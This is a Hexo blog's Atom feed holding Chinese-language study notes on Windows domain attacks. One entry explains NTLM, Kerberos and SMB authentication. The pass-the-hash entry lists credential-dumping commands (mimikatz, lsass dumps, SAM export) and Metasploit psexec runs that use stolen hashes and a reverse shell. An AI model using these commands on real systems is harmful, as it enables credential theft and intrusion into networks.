<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-02-16T09:56:36.869Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://example.com/2021/02/16/%E5%9F%9F%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
    <id>http://example.com/2021/02/16/%E5%9F%9F%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</id>
    <published>2021-02-16T15:57:22.365Z</published>
    <updated>2021-02-16T09:56:36.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><p>如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了<br>其中若hash加密方式是 rc4 ，那么就是pass the hash<br>若加密方式是aes key,那么就是pass the key<br>注意NTLM和kerberos协议均存在PTH:<br>NTLM自然不用多说<br>kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响</p><p>那前提就是要获取hash值了</p><h2 id="HASH获取"><a href="#HASH获取" class="headerlink" title="HASH获取"></a>HASH获取</h2><p>1.使用meterpreter里的mimikatz模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;load mimikatz</span><br><span class="line">meterpreter&gt;mimikatz_command -f mimikatz的指令</span><br><span class="line">privilege::debug 提权  samdump::hashes dump哈希  </span><br><span class="line">或者</span><br><span class="line">meterpreter&gt;msv&#x2F;kerberos&#x2F;widgst</span><br></pre></td></tr></table></figure><p>2.使用meterpreter自带的hash获取模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;hashdump</span><br><span class="line">meterpreter&gt;run windows&#x2F;gather&#x2F;smart_hashdump   (推荐使用这个)</span><br></pre></td></tr></table></figure><p>3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理<br>意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了. 使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可</p><p>4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希</p><p>procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp</span><br><span class="line">然后将其传回本地</span><br><span class="line">通过mimikatz.exe分别执行以下命令</span><br><span class="line">&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br><a href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p>5.使用cobalt strike 获取hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt;hashdump</span><br><span class="line">beacon&gt;mimikatz mimikatz指令</span><br></pre></td></tr></table></figure><p>6.利用sam表</p><p>mimikatz在线读sam表中的hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p>将sam表下载到本地由mimikatz分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line">在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析</span><br><span class="line">mimikatz运行</span><br><span class="line">mimikatz # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br><span class="line">Domain : STU1</span><br><span class="line">SysKey : fd4639f4e27c79683ae9fee56b44393f</span><br><span class="line">Local SID : S-1-5-21-1982601180-2087634876-2293013296</span><br><span class="line"></span><br><span class="line">SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : liukaifeng01</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure><h2 id="hash-传递攻击-PTH-（Pass-the-Hash"><a href="#hash-传递攻击-PTH-（Pass-the-Hash" class="headerlink" title="hash 传递攻击 PTH （Pass the Hash)"></a>hash 传递攻击 PTH （Pass the Hash)</h2><p>1.msf里使用psexec模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;psexec  &#x2F;&#x2F;以root启动msf</span><br><span class="line">[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhsot 192.168.64.133</span><br><span class="line">lhsot &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhost 192.168.64.133</span><br><span class="line">lhost &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lport 443</span><br><span class="line">lport &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set rhost 192.168.52.138</span><br><span class="line">rhost &#x3D;&gt; 192.168.52.138</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser &#x3D;&gt; Administrator</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5  &#x2F;&#x2F;一般选择NTLM HASH</span><br><span class="line">SMBPass &#x3D;&gt; 8a963371a63944419ec1adf687bb1be5</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; run</span><br></pre></td></tr></table></figure><p>2.使用mimikatz</p><p>我们在目标机里放置mimikatz.exe 然后执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:&quot;xxx.com&quot; &#x2F;ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  &#x2F;&#x2F;自行修改</span><br></pre></td></tr></table></figure><p>之后便会弹出一个cmd窗口，在这个窗口里链接机器即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.222.131\c$</span><br></pre></td></tr></table></figure><p>3.使用cobalt strike</p><p>在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-9.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-10.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PTH&quot;&gt;&lt;a href=&quot;#PTH&quot; class=&quot;headerlink&quot; title=&quot;PTH&quot;&gt;&lt;/a&gt;PTH&lt;/h1&gt;&lt;p&gt;如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了&lt;br&gt;其中若hash加密方式是 rc4</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2021/02/16/Windows%E5%9F%9F%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/"/>
    <id>http://example.com/2021/02/16/Windows%E5%9F%9F%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/</id>
    <published>2021-02-16T15:57:22.364Z</published>
    <updated>2021-02-16T10:01:49.085Z</updated>
    
    <content type="html"><![CDATA[<h1 id="域，工作组，活动目录"><a href="#域，工作组，活动目录" class="headerlink" title="域，工作组，活动目录"></a>域，工作组，活动目录</h1><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>工作组可以认为是同一网络内，功能相似的电脑进行的分组。<br>举个例子：<br>“在一个网络内，可能有成百上千台电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。为了解决这一问题，Windows 9x/NT/2000就引用了“工作组”这个概念，将不同的电脑一般按功能分别列入不同的组中，如财务部的电脑都列入“财务部”工作组中，人事部的电脑都列入“人事部”工作组中。你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。 ”<br>这就是工作组，但是在工作组中的电脑还是各自管理。当其中一台计算机访问另一台计算机时还是要经过另一台计算机的认证的</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>域，是一群相互信任的计算机的集合<br>想要访问域中资源就必须经过一台负责每一台联入网络的电脑和用户的验证工作的服务器，这个服务器叫做 域控制器 （Domain Controller，简写为DC） 的安全认证。每个域至少要有一个域控制器。<br>当某计算机连入域时，DC就会鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息不正确，域控制器就拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源 。<br>另外，当一个域和另一个域建立信任关系后，两个域就可以按需要相互管理</p><h2 id="工作组和域的区别"><a href="#工作组和域的区别" class="headerlink" title="工作组和域的区别"></a>工作组和域的区别</h2><p>“ 工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。 ”</p><h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>活动目录 (Active Directory,AD) ,用于存储有关网络对象的信息。帮助用户快速准确的找到所需的信息服务,“ 如果把企业的内网看成一本字典，那么<strong>内网里的资源就是字典里的内容，活动目录就相当于字典的索引</strong> ”</p><p>活动目录的功能：</p><ul><li>账号集中管理</li><li>软件集中管理</li><li>环境集中管理</li><li>增强安全性</li><li>更可靠，更短的宕机时间</li></ul><p>“要实现域环境，实际上就是安装AD，<strong>如果内网中的一台计算机上安装了AD，它就变成了DC(用于存储活动目录数据库的计算机)。</strong>”</p><p>参考 <a href="http://www.nosqlnotes.com/technotes/kerberos-protocol/">http://www.nosqlnotes.com/technotes/kerberos-protocol/</a><br><a href="https://www.anquanke.com/post/id/190261">https://www.anquanke.com/post/id/190261</a></p><h1 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h1><p>NTLM也是一个认证协议，与Kerberos协议功能是一样的，不过NTLM的安全性可没有Kerberos好</p><h2 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h2><p>NTLM协议验证机制是基于 挑战(chanllage)/回应(response) 模式的</p><p>它的验证模式大致如下:</p><ol><li>用户输入账号密码，本地把密码加密为一个hash值，称为<strong>NTML-Hash</strong></li><li>客户端向服务器发送用户名 （这个数据称为 <strong>TYPE 1 Negotiate</strong> ）</li><li>服务端接收请求，判断数据库中该用户名是否存在，若存在则生成一个16位随机数称之为chanllage。同时将chanllage返回给客户端 （ <strong>TYPE 2</strong> ）</li><li>客户端收到chanllage后将其用上面生成的hash值来加密这个chanllange，并与用户名，chanllange等组合到一起得到<strong>Net-NTLMHash</strong> 最后将 Net-NTLMHash 封装到 <strong>TYPE 3 NTLM_AUTH</strong>消息中发往服务器。</li><li>服务器收到TYPE3后，用自己数据库中该用户的密码的NTML-Hash加密chanllage，并比较自己计算出的 <strong>Net-NTLMHash</strong> 与客户端发过来的 <strong>Net-NTLMHash</strong> ，若相同则认证成功</li><li>（以上是客户端-服务端模型，若是在域中，验证步骤就会有点不同）<br>若在域中，那么服务端在第5步收到TYPE3后不会自行进行比对，而是将 Net NTLM-Hash 转发给域控制器DC，由DC进行最后的 Net NTLM-Hash 比较认证</li></ol><h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>Kerberos协议，是一个常用的认证与授权协议(下面只是简化过的大致流程，具体流程请看下面的wireshark抓包分析)</p><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20210216180106741.png" alt="image-20210216180106741" title="">                </div>                <div class="image-caption">image-20210216180106741</div>            </figure><h2 id="参与的关键角色"><a href="#参与的关键角色" class="headerlink" title="参与的关键角色"></a>参与的关键角色</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20210216180113335.png" alt="image-20210216180113335" title="">                </div>                <div class="image-caption">image-20210216180113335</div>            </figure><ul><li><strong>Client</strong>: Application Client 应用客户端</li><li><strong>AS</strong>: Authentication Server 用来认证用户身份</li><li><strong>TGS</strong>: Ticket-Granting Service 用来授权服务访问</li><li><strong>SS</strong>: Service Server 用户所请求的服务</li><li>其中AS和TGS都属于KDC系统（ 密钥分发中心 ）</li></ul><h2 id="认证："><a href="#认证：" class="headerlink" title="认证："></a>认证：</h2><p>以下的加密都是对称加密</p><h3 id="1-用户登录"><a href="#1-用户登录" class="headerlink" title="1.用户登录"></a>1.用户登录</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20210216180119322.png" alt="image-20210216180119322" title="">                </div>                <div class="image-caption">image-20210216180119322</div>            </figure><p>用户先输入用户名和密码，其中密码在这个阶段会被单向hash函数加密为一个密钥，用来解密后面的信息</p><h3 id="2-请求身份认证（client和kdc双向认证）"><a href="#2-请求身份认证（client和kdc双向认证）" class="headerlink" title="2.请求身份认证（client和kdc双向认证）"></a>2.请求身份认证（client和kdc双向认证）</h3><h4 id="2-1-客户端向AS发送认证请求"><a href="#2-1-客户端向AS发送认证请求" class="headerlink" title="2.1 客户端向AS发送认证请求"></a>2.1 客户端向AS发送认证请求</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20210216180123912.png" alt="image-20210216180123912" title="">                </div>                <div class="image-caption">image-20210216180123912</div>            </figure><p>客户端向as发送用户名信息（明文）（进发送用户名而没有发送密码）</p><h4 id="2-2AS确认客户端身份"><a href="#2-2AS确认客户端身份" class="headerlink" title="2.2AS确认客户端身份"></a>2.2AS确认客户端身份</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20210216180128612.png" alt="image-20210216180128612" title="">                </div>                <div class="image-caption">image-20210216180128612</div>            </figure><p>AS先把用户名在数据库中查找一下，如果该用户名存在则找到该用户的密码使用单向hash函数生成client密钥并返回Msg A和B。<br>A中的内容是一个被Client密钥加密的用于生成Authenticator1的数据<br>B中的内容是一个被TGS密钥加密的一堆信息叫做<strong>TGT</strong>，当前无TGS密钥故无法解开，其中包含 客户端ID，有效期 ，Client网络地址以及MSG A解密后的内容</p><h3 id="3-请求服务授权（client请求kdc认证server）"><a href="#3-请求服务授权（client请求kdc认证server）" class="headerlink" title="3. 请求服务授权（client请求kdc认证server）"></a>3. 请求服务授权（client请求kdc认证server）</h3><h4 id="3-1-客户端向TGS发送请求服务授权请求"><a href="#3-1-客户端向TGS发送请求服务授权请求" class="headerlink" title="3.1 客户端向TGS发送请求服务授权请求"></a>3.1 客户端向TGS发送请求服务授权请求</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20210216180133024.png" alt="image-20210216180133024" title="">                </div>                <div class="image-caption">image-20210216180133024</div>            </figure><p>Client在MSG C向TGS发送 请求的服务的ID，2.2中的TGT，MSG D 发送由 **[Client/TGS SessionKey]**加密的Authenticator 1 {Client ID, Timestamp}。</p><h4 id="3-2-TGS为Client响应服务授权票据"><a href="#3-2-TGS为Client响应服务授权票据" class="headerlink" title="3.2 TGS为Client响应服务授权票据"></a>3.2 TGS为Client响应服务授权票据</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20210216180137424.png" alt="image-20210216180137424" title="">                </div>                <div class="image-caption">image-20210216180137424</div>            </figure><ul><li><p>Msg E</p><p>  使用</p><p>[Service密钥]</p><p>加密的Client-To-Server Ticket, 该Ticket中包含了如下信息:</p><ul><li><strong>[Client/Server SessionKey]</strong></li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></li><li><p><strong>Msg F</strong>  使用**[Client/TGS SessionKey]<strong>加密的</strong>[Client/Server SessionKey]**。</p></li></ul><h3 id="4-发送服务请求（client与ss双向认证）"><a href="#4-发送服务请求（client与ss双向认证）" class="headerlink" title="4. 发送服务请求（client与ss双向认证）"></a>4. 发送服务请求（client与ss双向认证）</h3><h5 id="4-1-Client向SS-Service-Server-发送服务请求"><a href="#4-1-Client向SS-Service-Server-发送服务请求" class="headerlink" title="4.1 Client向SS(Service Server)发送服务请求"></a>4.1 Client向SS(Service Server)发送服务请求</h5><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20210216180142668.png" alt="image-20210216180142668" title="">                </div>                <div class="image-caption">image-20210216180142668</div>            </figure><p>发送的消息中包括：</p><ul><li><strong>Msg E</strong>  上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client为SS携带的消息。</li><li><strong>Msg G</strong>  由**[Client/Server SessionKey]<strong>加密的</strong>Authenticator 2**，包含{Client ID, Timestamp}信息。<br>这里的Authenticator 2区别于前面3.1步骤中的Authenticator 1。</li></ul><p><strong>Note</strong></p><ol><li><strong>[Client/Server SessionKey]**并未直接透明传输，而是被包含在使用</strong>[Service密钥]**加密的Msg E中。</li><li>既然**[Client/Server SessionKey]<strong>并不直接透明传输， Client需要向SS证明自己拥有正确的</strong>[Client/Server SessionKey]<strong>，所以，Authenticator 2使用了</strong>[Client/Server SessionKey]**加密。</li></ol><h4 id="4-2-SS响应Client"><a href="#4-2-SS响应Client" class="headerlink" title="4.2 SS响应Client"></a>4.2 SS响应Client</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20210216180146841.png" alt="image-20210216180146841" title="">                </div>                <div class="image-caption">image-20210216180146841</div>            </figure><h2 id="Kerberos抓包分析"><a href="#Kerberos抓包分析" class="headerlink" title="Kerberos抓包分析"></a>Kerberos抓包分析</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-17.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>以上是kerberos协议简化图</p><h3 id="ASREQ"><a href="#ASREQ" class="headerlink" title="ASREQ"></a>ASREQ</h3><p>即客户端往服务端的第一次通讯</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-18.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>我抓到的包的样子,我们来解读一下<br>1.pvno: 标记着kerberos协议的版本<br>2.msg-type: 标记着这个包的类型， ASREQ对应的就是KRBAS_REQ(0x0a)<br>3.padata:用于存储一些认证信息<br>其实这个头下面还有很多不同的类型的头，但是这里抓到了PA-DATA PA-ENC-TIMESTAMP和PA-DATA PA-PAC-REQUEST这两个头部，但是这两个头部是padata最常用最核心的头部.<br>PA-DATA PA-ENC-TIMESTAMP : 就是用户hash加密的时间戳,作用在于:as配合用户的明文账户(cname头)在数据库中查询该用户是否存在，若存在则取用其hash来解密这个时间戳，若揭秘成功则认证通过<br>PA-DATA PA-ENC-TIMESTAMP:  这个是启用PAC(一个控制用户权限的东西)支持的扩展。<br>4.req-body:请求主体，也包含了许多信息.这个头里面比较重要的东西是<br>cname:存储着发送请求的用户名（明文用户名）<br>sname:这个包含的是服务端的身份, 在ASREQ里面是krbtgt ，还有所在域名称。till为到期时间，nonce为随机生成数<br>realm:所在域名称<br>etype:告知服务器，这个hash的加密方式</p><p>之前一直困扰我的 “为什么有些文章说的第一步是向服务器发送明文账户名，有些文章是向服务器发送时间戳hash”问题抓了一下包就懂了..</p><h3 id="ASREP"><a href="#ASREP" class="headerlink" title="ASREP"></a>ASREP</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20-1613469489411.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>1.ticket:这个就是TGT了。<br>tkt-vno:票据格式版本号<br>realm:所在域名<br>sname:同asres<br>enc-part:被krbtgt密钥加密的票据本体部分<br>2.enc-part:被client hash 加密的login session key</p><h3 id="TGSREQ"><a href="#TGSREQ" class="headerlink" title="TGSREQ"></a>TGSREQ</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-21-1613469489531.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>1.ap-req-&gt;…-&gt;tikect: 可以发现TGSREQ把整个TGT发送给了TGS<br>2ap-req-&gt;…-&gt;authenticator:被login session key加密的时间戳和client id</p><h3 id="TGSREP"><a href="#TGSREP" class="headerlink" title="TGSREP"></a>TGSREP</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-22-1613469489566.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>1.tikect:这里就是TGS部分了。<br>enc-part：这里的enc-part是被所请求的服务的用户hash加密的<br>2.enc-part:被login session key加密的service session key</p><h1 id="SMB协议"><a href="#SMB协议" class="headerlink" title="SMB协议"></a>SMB协议</h1><p>SMB协议是一个用于两台计算机间共享文件 、打印机、串口等功能的协议。<br>网上邻居功能就是依靠SMB协议而起的。<br>通过smb协议，一台计算机可以在经过smb认证后读写另一台计算机上的一些文件。<br>smb协议一般架设在NetBios协议之上。<br>NetBIOS 使用下列端口：UDP/137（NetBIOS 名称服务）、UDP/138（NetBIOS 数据报服务）、TCP/139（NetBIOS 会话服务）；SMB 使用下列端口：TCP/139、TCP/445。</p><h2 id="SMB认证"><a href="#SMB认证" class="headerlink" title="SMB认证"></a>SMB认证</h2><p>如果我们想依靠smb协议去读写另一台计算机上的文件，那么其中的SMB认证情况是如何呢？我们简单分析一下。</p><p>1.版本确立阶段<br>2.用户认证阶段<br>3.资源链接阶段<br>4.资源读写阶段</p><p>更详细一点。<br>1.版本确立阶段。客户端先发送自己支持的SMB协议版本给服务器，服务器收到后向客户端列出希望使用的版本。若客户端支持的smb版本服务器均不支持，则返回 0XFFFFH，结束通信 。<br>2.用户认证阶段。确立好认证版本后，就是客户端发送账户密码给服务端进行身份验证了。服务器收到后返回认证成功或失败<br>3.资源链接阶段。用户认证通过后，客户端发送自己想要访问的资源名，服务器收到后返回允许或拒绝<br>4.资源读写阶段，客户端开始读写服务器上文件。</p><p>看起来比ntlm和kerberos简单多了。抓包分析一下。</p><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>1.1 客户端向服务端列出当前支持的smb版本</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-8-1613469629629.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>1.2服务器返回希望的SMB版本</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-9-1613469629498.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>1.3这里说个题外话，此时服务器只是选中了SMB2，但是SMB2也分了很多版本，所以客户端还会基于SMB2继续进行版本问询</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-10-1613469629754.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>然后服务器再继续选择一个细分版本，版本协商结束</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-11-1613469629754.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>2.1 客户端向服务端提供用户信息。SMB协议的这一个部分使用NTLM协议完成的。建议先看看NTLM认证再过来<br>首先客户端发送一个请求NTLM认证的包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-13-1613469629752.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>2.2服务端返回challenge</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-14-1024x263-1613469629630.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>2.3 客户端发送用户名，被client hash加密的challenge（NTLM RESPONSE）给服务端</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-15-1024x494-1613469630024.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>2.4服务端进行认证处理，返回认证成功或失败，下图是成功时，返回 会话建立字样</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-16-1613469630157.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>3.1客户端发送请求的资源</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-17-1024x487-1613469630117.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>3.2服务端返回允许或拒绝</p><p>拒绝访问</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-18-1613469630333.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>返回允许</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-22-1613469630346.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>\4. 各种读写操作请求</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-21-1024x303-1613469630328.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;域，工作组，活动目录&quot;&gt;&lt;a href=&quot;#域，工作组，活动目录&quot; class=&quot;headerlink&quot; title=&quot;域，工作组，活动目录&quot;&gt;&lt;/a&gt;域，工作组，活动目录&lt;/h1&gt;&lt;h2 id=&quot;工作组&quot;&gt;&lt;a href=&quot;#工作组&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2021/02/16/Windows%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E6%B1%87/"/>
    <id>http://example.com/2021/02/16/Windows%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E6%B1%87/</id>
    <published>2021-02-16T15:57:22.362Z</published>
    <updated>2021-02-16T09:57:12.557Z</updated>
    
